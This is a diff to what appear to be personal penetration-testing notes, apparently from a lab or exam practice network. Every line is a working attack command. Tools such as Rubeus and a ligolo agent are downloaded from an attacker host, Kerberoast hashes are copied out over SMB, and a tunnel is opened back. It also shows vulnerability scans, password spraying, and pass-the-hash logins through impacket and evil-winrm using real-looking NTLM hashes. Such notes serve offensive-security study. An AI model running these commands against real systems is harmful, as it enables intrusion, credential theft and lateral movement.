@@ -79,6 +79,12 @@ bloodhound
 iwr -uri http://192.168.45.219/Rubeus.exe -Outfile Rubeus.exe
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 copy hashes.kerberoast \\192.168.45.219\smb
+
+# got a couple kerberoastable users
+
+sudo ip route add 10.10.115.0/24 dev ligolo
+iwr -uri http://192.168.45.219/agent.exe -Outfile agent.exe
+./agent.exe -ignore-cert -connect 192.168.45.219:11601
 ```
 
 .143
@@ -199,10 +205,14 @@ sudo su
 ```
 nmap 192.168.225.145
 nmap -sT -A -Pn -p 80 192.168.225.145
+sudo nmap -sV -p 80 --script "vuln" 192.168.225.145
 gobuster dir -u http://192.168.225.145 -w /usr/share/wordlists/dirb/big.txt
+gobuster dir -u http://192.168.225.145 -w /usr/share/wordlists/dirb/common.txt
+unicornscan -mU -I 192.168.225.145:80 -v
+# port 1978 unisql is open
 
 # did not work
-crackmapexec smb 192.168.225.145 -u Administrator -p 'December31' --continue-on-success
+crackmapexec smb 192.168.225.141 -u Administrator -p 'December31' --continue-on-success
 crackmapexec smb 192.168.225.145 -u support -p 'Freedom1' --continue-on-success
 crowbar -b rdp -s 192.168.225.145/32 -u Administrator -C passwords.txt -n 1
 
@@ -210,4 +220,9 @@ crowbar -b rdp -s 192.168.225.145/32 -u Administrator -C passwords.txt -n 1
 impacket-psexec -hashes :e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@192.168.225.145
 impacket-psexec -hashes :9a3121977ee93af56ebd0ef4f527a35e mary.williams@192.168.225.145
 impacket-wmiexec -hashes :9a3121977ee93af56ebd0ef4f527a35e mary.williams@192.168.225.141
+```
+
+.142
+```
+evil-winrm -i 10.10.115.142 -u celia.almeda -H "e728ecbadfb02f51ce8eed753f3ff3fd"
 ```
